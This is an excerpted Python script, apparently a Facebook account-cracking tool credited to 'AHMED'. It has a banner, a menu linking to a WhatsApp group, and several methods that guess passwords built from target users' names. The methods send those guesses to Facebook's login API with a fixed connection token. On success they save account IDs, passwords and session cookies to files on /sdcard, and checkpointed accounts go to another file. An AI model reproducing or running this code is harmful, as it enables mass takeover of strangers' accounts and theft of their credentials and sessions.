...
logo =                                          """            
\033[1;37m   _____ _                      
  \033[1;37m/ ___/(_)___ _____ ___  ____ _
\033[1;37m  \__ \/ / __ `/ __ `__ \/ __ `/
\033[1;37m ___/ / / /_/ / / / / / / /_/ / 
\033[1;37m/____/_/\__, /_/ /_/ /_/\__,_/  
 \033[1;37m      /____/                   
\033[1;37m------------------------------------------------
\033[1;37m Owner   :          AHMED SHAR 
\033[1;37m Facebook:            Prince king hu yawr 
\033[1;37m Github  :            TVAHMED
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/03160114715')
        pass
    elif select =='F':
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AHMED] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [AHMED-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/AHMED_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/AHMED_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AHMED] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [AHMED-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/AHMED_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [AHMED-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/AHMED_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[AHMED] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    oks.append(sid)
                    open('/sdcard/AHMED_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
